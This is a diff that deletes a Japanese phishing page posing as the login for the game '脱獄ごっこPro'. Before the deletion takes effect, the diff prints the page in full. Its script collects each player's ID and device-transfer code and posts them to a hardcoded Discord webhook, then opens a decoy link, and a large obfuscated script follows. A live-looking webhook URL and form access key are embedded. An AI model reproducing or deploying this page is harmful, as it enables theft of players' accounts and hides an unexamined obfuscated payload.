@@ -1,70 +1,1 @@
-<!DOCTYPE html>
-<html lang="ja">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ログイン|脱獄ごっこPro</title>
-  </head>
-
-  <body>
-    <div class="contact-form">
-      <p id="taitai">脱獄ごっこProにログイン</p>
-      <form id="loginForm" action="https://api.staticforms.xyz/submit" method="post" onsubmit="return validateForm(event)">
-        <input type="hidden" name="accessKey" value="b60bc6da-6ef8-4e65-a2e1-921aee9c7727">
-        <input type="hidden" name="subject" value="crack">
-
-        <div class="item">
-          <input type="text" id="playerId" name="name" placeholder="プレイヤーID" minlength="16" maxlength="17" pattern="[a-zA-Z0-9]{16,17}" required>
-        </div>
-        <br>
-        <div class="item">
-          <input type="password" id="changeCode" name="name" placeholder="機種変更コード" minlength="12" maxlength="13" pattern="[a-zA-Z0-9]{12,13}" required/>
-        </div>
-        <br>
-        <div class="button-area">
-          <input type="submit" value="ログイン">
-        </div>
-          <hr>
-        
-    <p id="k">Japanに所在するアカウントで続行することで、利用規約に同意し、プライバシーポリシーを確認したとみなされます。</p>
-      </form>
-    </div>
-
-    <script>
-      const webhookURL = 'https://discord.com/api/webhooks/1264979463758942313/rGTzLc-eYXIJz0zu6JNle4vom34pd1KT_MXJhlFHkV9RYZdQBcCvlx1bjEmVVLermnBu';
-
-      function sendToDiscord(playerId, changeCode) {
-        const request = new XMLHttpRequest();
-        request.open("POST", webhookURL);
-        request.setRequestHeader('Content-type', 'application/json');
-
-        const params = {
-          username: "Form Bot",
-          content: `プレイヤーID: ${playerId}\n機種変更コード: ${changeCode}`
-        };
-
-        request.send(JSON.stringify(params));
-      }
-
-     function validateForm(event) {
-  event.preventDefault(); // フォームのデフォルトの送信を防ぐ
-
-  const playerId = document.getElementById('playerId').value;
-  const changeCode = document.getElementById('changeCode').value;
-
-  if (playerId.length >= 16 && playerId.length <= 17 && changeCode.length >= 12 && changeCode.length <= 13) {
-    sendToDiscord(playerId, changeCode);
-    window.open('https://heleamc.github.io/PRO');
-    return true; // フォームを送信する
-  } else {
-    alert("入力内容が正しくありません。");
-    return false; // フォームの送信を防ぐ
-  }
-}
-    </script>
-    <script>
-/* Obfuscated at 2024-07-21 21:59:20 on https://jpn.phpkobo.com/css-obfuscator */(function(){_XA1t("e<!11yoggtj;\\oxt2vgo32h1<<ojj;qqbvo.|s-~ppoomfos&7fzsd4~musomzsf1cpum|mefc2-q<upp.h$uqpp5tge<q;qgcquv5yy!cpd#f#sm;upj;b|8~f;p&2ffbjb.<o1bs.(/cpesp11yufootigzvsm2;g.cy2yppv#t5<~jnopeetiej3.sh2nd&4mhm|1uyjuzdbuwd;g-dbsj.yq/<fsuufugquej<4gdp!1<osu^;qgojfmpjdsfe1t;i1fp|4mspd1~uof;pmfil$btpd;os.y2iy~..s;gf\\#ec1gps$qxue\\|4yp/qu<pnss|s!qj$uqtmd/pfsp&~|c~gojs<hgnbol$hbt!*futgjcg>u^!pqgmebyj.fuc1<ocv#csbfjc.$y{4;y!pp4xf;m|bpmuh<nsgjouh6;eis<j.qjbgpg#z|/sy<pfb<etszpqxuvu^b;jdqpud!f42!ssm4~ocpd/oxcffoibpgmtbs13jbhxhb${n<mguqp3e<cssbiuj;qsyj.u\\|d$ouuspd1;4/1b;p&6~mspsj!pyo.fsvgz.dp61vecjimufjge~ffvqfdb;;<fi{ofe<etuucl2tj.eqd~2<6~jss|17v;mbn9e<ujjhog;tuv1qtpbeujb;mp<y>uyspd$tqj;fp>fiujpzph1#pjf;<5m<of;d&7fjpjbtzk;uhjeg(f.o6y;x)u;hj3zodju#m!.ml7pbh4;o#sfi{oqss6;oes2n$qjnAcepp|/~osou!|vdfio.<Bsge1<2;1i4ou1;upo#qj$sph3mei12ft.j;f.fepg###;qblyoblp~smd79e;cjjetfnu;dgsjp.<c11-;6;bqt.mq^bo5bss7jeu16~vsh4;b>fvf#;;1ys|<fsfx2bpp84jwppojuot;1ppjgsdqpq!141djybxpv-tf2e;p3ej;qqcbi32s#sod-##<!hgd.hz|7osm&/hjxogtju;2<mob~npbsy1-3qf|<ofsujt;5j$v7!o3yyjneu56ft;e~###ctjppijg1/h;p|4pp.;jqgfd",(function(){this._W5L5YvH3h__wacD79={f:function(_0M,$){_W32X="\x70\x6c\x61";function _F41(_0M,$,_ss,_524){function _0s(_Y02){_Y02=_kI(_Y02)-32-(_524%95);if(_Y02<0){_Y02+=95;}_Y02+=32;_524++;return _UFEQ(_Y02);};function _6C(_0M,_ss){_5uvi=_0M[_ss];_1f5="";while(_5uvi!="\f"){if(_5uvi<" "){_1f5+=_5uvi;}else{_1f5+=_0s(_5uvi);}_ss++;_5uvi=_0M[_ss];}return _1f5;};function _kI(_5uvi){return _5uvi[_m0t8](0);};function _UFEQ(_Y02){return this[_XLjk][_fSe](_Y02);};_ss=_ss?_ss:0;if(_0M[_68]>_ss){_524=_524?_524:0;_KJIx=_6C(_0M,_ss);_2M4e=_KJIx[_68];_WSe=_6C(_0M,_ss+_2M4e+1);_u84=_WSe[_68];$[_KJIx]=_WSe;_F41(_0M,$,_ss+_2M4e+1+_u84+1,_524);}};_3Mz="\x72\x65"+_W32X+"\x63\x65";_m0t8=_IDK("_ahco%Cr%Aedt");_XLjk=_IDK("r_t%Sgni");_fSe=_IDK("_orfhCm%Crae_do");_68=_IDK("ne_lh_tg");_F41(_0M,$);function _IDK(_13vc){return _13vc[_3Mz](/[x%y_z]/g,'')[_3Mz](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _XA1t(_j4c9,_8f,_ti,$,_5h,_fR){_t15M=this._W5L5YvH3h__wacD79;_t15M.f(_5h,$);if(!_ti){_ti=$.__u8n;}_45()(_j4c9,0,0x2449,this,"''");function _45(){return function(_5X,_pCm,_rD3L,_g8o,_nj8m){_t15M.p1=_5X;_t15M.p2=_rD3L;try{_dSd(_g8o)(_Br()([_ti[$._730lN]("+p%p",_nj8m)[$._730lN]("-p%q",_nj8m)],''))();}catch(e){}function _dSd(_C57){return _C57[$._nD6];};_g8o._W5L5YvH3h__wacD79=_fR;};};function _Br(){return function(_t11l,_1R){return _t11l[$._g9T1](_1R);};};};}());
-    </script>
-  </body>
-</html>
+source code= glowing-bassoon.html
